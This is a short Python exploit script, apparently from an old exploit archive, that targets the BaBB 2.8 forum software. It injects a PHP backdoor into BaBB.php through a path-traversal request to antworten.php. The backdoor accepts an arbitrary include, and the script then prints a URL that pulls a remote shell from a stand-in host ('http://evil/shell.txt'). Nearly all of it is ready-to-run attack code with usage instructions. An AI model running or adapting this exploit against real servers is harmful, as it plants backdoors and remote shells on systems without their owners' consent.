#!usr/bin/python
#####################################################################################
####                   BaBB 2.8 Full Code Injection Exploit                      ####
#####################################################################################
#                                                                                   #
#AUTHOR : Sina Yazdanmehr (R3d.W0rm)                                                #
#Discovered by : Sina Yazdanmehr (R3d.W0rm)                                         #
#Our Site : http://IrCrash.com                                                      #
#My Official WebSite : http://R3dW0rm.ir                                            #
#IRCRASH Team Members : Khashayar Fereidani - R3d.w0rm (Sina Yazdanmehr)            #
#####################################################################################
#                                                                                   #
#Download : http://sunet.dl.sourceforge.net/project/babb/BaBB%20Full/BaBB%202.8/BaBB_2.8_full.zip
#                                                                                   #
#Dork :  :(                                                                           #
#                                                                                   #
###################################### TNX GOD ######################################
import sys,urllib
if len(sys.argv) < 2 :
    print "Powered by : R3d.W0rm"
    print "http://IrCrash.com - http://R3dW0rm.ir"
    print "Usage : expl.py http://[target]/[path]"
    exit()
data = urllib.urlopen(sys.argv[1] + '/antworten.php?send=true&code=/../../../BaBB.php&name=<?php%20if($_GET[\'t\']==1){include%20$_GET[\'f\'];}/*').read()
if data != '' :
    print "Powered by : R3d.W0rm"
    print "http://IrCrash.com - http://R3dW0rm.ir\n\r"
    print sys.argv[1]  + "/BaBB.php?t=1&f=http://evil/shell.txt"
    exit()
print 'Attack failed.'

# milw0rm.com [2009-08-18]